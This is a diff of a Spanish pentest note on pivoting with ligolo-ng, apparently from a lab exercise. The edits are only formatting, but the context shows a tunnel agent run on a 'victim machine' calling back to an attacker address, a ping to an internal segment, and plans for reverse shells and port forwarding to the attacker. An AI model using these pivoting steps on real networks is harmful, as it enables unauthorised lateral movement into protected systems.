@@ -35,7 +35,7 @@ $ ./ligolo-proxy -selfcert -laddr 0.0.0.0:4433
 
 En la máquina víctima que nos hará de salto entre ambos segmentos de red ejecutaremos lo siguiente:
 
-```PowerShell
+```bash
 > .\ligolo-agent.exe -connect 192.168.45.237:11601 -ignore-cert -retry
 ...
 time="2023-10-23T10:34:58-07:00" level=info msg="Connection established" addr="192.168.45.237:4433"
@@ -61,7 +61,7 @@ ligolo-ng >> start
 
 Probamos si tenemos conexión a la red a la que queremos llegar:
 
-```BASH
+```bash
 $ ping 172.16.249.11
 
 PING 172.16.249.11 (172.16.249.11) 56(84) bytes of data.
@@ -73,7 +73,8 @@ PING 172.16.249.11 (172.16.249.11) 56(84) bytes of data.
 Fantástico!!! Ya tenemos conexión con el segmento de red desde nuestra máquina!
 
 ----
-- <font color="#c0504d">LLEGADOS A ESTE PUNTO EL PROBLEMA QUE SE NOS PRESENTA ES QUE LAS MÁQUINAS A LAS QUE YA PODEMOS ACCEDER NO TIENEN CONEXIÓN DIRECTA HACIA NOSOTROS, POR LO QUE UNA REVERSE SHELL O TRANSFERENCIA DE ARCHIVOS NO FUNCIONARÍA. PARA SOLUCIONARLO HAREMOS UN</font> _PORT FORWARDING_ <font color="#c0504d">HACIA NUESTRA MÁQUINA ATACANTE.</font>
+- <font color="#c0504d">LLEGADOS A ESTE PUNTO EL PROBLEMA QUE SE NOS PRESENTA ES QUE LAS MÁQUINAS A LAS QUE YA PODEMOS ACCEDER NO TIENEN CONEXIÓN DIRECTA HACIA NOSOTROS, POR LO QUE UNA REVERSE SHELL O TRANSFERENCIA DE ARCHIVOS NO FUNCIONARÍA. PARA SOLUCIONARLO HAREMOS UN</font> _PORT FORWARDING_ <font color="#c0504d"> HACIA NUESTRA MÁQUINA ATACANTE.</font>
+
 ----
 
 #### PORT FORWARDING HACIA NUESTRA MÁQUINA (LISTENER LIGOLO-NG)
@@ -117,5 +118,4 @@ $ sudo ip link del ligolo
 
 -----
 
-Repositorio de descarga:
-https://github.com/nicocha30/ligolo-ng
+Repositorio oficial de GitHub [aquí](https://github.com/nicocha30/ligolo-ng)
